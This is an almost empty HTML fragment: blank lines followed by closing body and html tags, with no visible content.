  

  

  

  
  

  

  

  

</body>
</html>
